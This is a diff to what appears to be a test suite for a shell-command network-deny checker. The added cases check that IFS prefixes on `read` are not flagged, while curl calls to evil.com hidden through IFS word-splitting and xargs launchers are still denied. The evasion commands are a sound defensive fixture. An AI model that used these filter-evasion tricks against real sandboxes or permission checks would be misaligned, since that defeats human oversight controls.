@@ -1585,6 +1585,37 @@ describe('delta review 5572280679: subshells, quoted word lists, process substit
     expect(d(`wget --dns-servers=1.1.1.1 ${U}`)).toMatchObject({ deny: true, hosts: ['1.1.1.1'] })
     expect(d(`curl --dns-servers 10.0.0.1 ${U}`).deny).toBe(false)
   })
+  it('an IFS prefix on `read` is local to read: a loop with no network action passes, the real shapes still deny (EGRESSIFSREAD1025)', () => {
+    // `IFS= read -r line` sets IFS for the read builtin only; it cannot re-split a later `$c`, so the
+    // ifs-expanded-command rule (a `$` command word next to an IFS assignment) must not fire on it.
+    const verdict = (c: string) => { const r = d(c); return { c, deny: r.deny, reason: r.deny ? r.reason : null } }
+    for (const c of [
+      'c=echo; while IFS= read -r line; do $c "$line"; done < list.txt',
+      'c=wc; while IFS= read -r line; do $c -l "$line"; done < list.txt',
+      'c=echo; while IFS=, read -r a b; do $c "$a" "$b"; done < list.txt',
+      'c=echo; while IFS=" " read -r a b; do $c "$a"; done < list.txt',
+      'c=echo; IFS= read -r line < list.txt; $c "$line"',
+      'c=echo; while LC_ALL=C IFS= read -r line; do $c "$line"; done < list.txt',
+      'c=echo; while IFS= LC_ALL=C read -r line; do $c "$line"; done < list.txt',
+    ]) expect(verdict(c)).toEqual({ c, deny: false, reason: null })
+    // Still denied: a real external curl in the same loop shape, and an IFS that IS changed for the
+    // shell (standalone assignment), also when a read prefix sits next to it.
+    for (const c of [
+      `while IFS= read -r u; do curl -s "$u"; done <<< 'https://example.org/'`,
+      'IFS=_; c=curl_https://evil.com; $c',
+      'IFS=_; c=curl_https://evil.com; while IFS= read -r l; do $c; done < list.txt',
+      'IFS=_ read -r a <<< "x"; IFS=_; c=curl_https://evil.com; $c',
+      'while IFS= read -r l; do IFS=_; c=curl_https://evil.com; $c; done < list.txt',
+      // the read prefix must not swallow a standalone IFS that is only separated by `;` or a newline
+      'IFS=_; c=curl_https://evil.com; read x; $c',
+      'IFS=_; read -r x < list.txt; c=curl_https://evil.com; $c',
+      'IFS=_\nread -r x < list.txt\nc=curl_https://evil.com\n$c',
+      'IFS=_ ; read -r x < list.txt; c=curl_https://evil.com; $c',
+      // only the builtin `read` is local: a command that merely starts with those letters is not
+      'c=curl_https://evil.com; IFS=_ readx; $c',
+    ]) expect({ c, deny: d(c).deny }).toEqual({ c, deny: true })
+    expect(d('IFS=_; c=curl_https://evil.com; $c')).toMatchObject({ deny: true, reason: 'ifs-expanded-command' })
+  })
   it('follow-up: a launcher adds its INPUT, so the shell it starts is not substituted from the visible words', () => {
     for (const c of [`echo "curl https://evil.com" | xargs sh -c '$0 "$@"'`, `echo "curl https://evil.com" | xargs sh -c '"$@"' _`,
       'echo "curl https://evil.com" | xargs -I{} sh -c {}', 'echo curl | xargs -I{} {} https://evil.com',
